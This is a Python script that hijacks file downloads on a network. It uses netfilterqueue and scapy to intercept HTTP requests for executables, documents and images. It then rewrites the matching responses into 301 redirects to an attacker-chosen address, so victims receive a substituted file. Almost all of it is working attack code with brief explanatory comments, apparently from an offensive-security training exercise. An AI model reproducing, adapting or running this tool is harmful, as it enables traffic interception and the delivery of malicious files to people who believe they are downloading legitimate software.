"""
A program that can hijack target device's Downloads.

Modifying data in HTTP layer

    1. Edit requests and responses
    2. replace download requests
    3. Inject code (javascript/html)
    ...
"""
import netfilterqueue
import optparse
import scapy.all as scapy

files = [".exe", ".app", ".pdf", ".doc", ".jpg", ".png", ".dmg"]

# HTTP request's ack number => response's sep number
# so the system know the response is corresponding to the request
ack_list = []

load = ""


def get_arguments():
    # Get command line arguments
    """
    Get the redirecting url from user input.

    :return: the url that you want target to redirect to
    :rtype: str
    """
    parser = optparse.OptionParser()

    # Get the name of intergace from user input
    parser.add_option("-r", "--redirect", dest="load",
                      help="ip address that you want to redirect to")

    (options, arguments) = parser.parse_args()

    # Code to handle error
    if not options.load:
        parser.error(
            "[-] Please specify an ip address, use --help for more info.")
    return options.load


def set_load(packet):
    """
    Set the load field in packet.

    :param packet: packet that we sinffed
    :type packet: packet
    :return: modified packet
    :rtype: packet
    """
    # HTTP status code: 3xx Redirection (redirect reqeuest to
    # somewhere else
    # 301 Moved Permanently: This and all future requests shoould
    # be directed to the given url
    load_str = "HTTP/1.1 301 Moved Permanently\nLocation: " + load + " \n\n"
    packet[
        scapy.Raw].load = load_str

    # avoid corruption
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_pacet(packet):
    """
    Callback function that capture HTTP request and modify HTTP response so that
    it redirects target device to specified url.
    
    :param packet: sniffed packet
    :type packet: packet
    """
    scapy_packet = scapy.IP(packet.get_payload())
    # looking for RAW layer
    if scapy_packet.haslayer(scapy.Raw):
        # looking for TCP Layer
        # HTTP request
        if scapy_packet[scapy.TCP].dport == 80:
            # hijack downloading file and run custom code
            for file in files:
                if file in scapy_packet[scapy.Raw].load:
                    print("[+] " + file + " Request")
                    # store request's ack number in ack_list
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    break

        # HTTP Resonse
        elif scapy_packet[scapy.TCP].sport == 80:
            # check if the response's seq contains number in our ack_list
            # then we know this is the response of a request that we are
            # interested in
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet)
                packet.set_payload(str(modified_packet))

    packet.accept()


if __name__ == "__main__":
    load = get_arguments()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_pacet)
    queue.run()
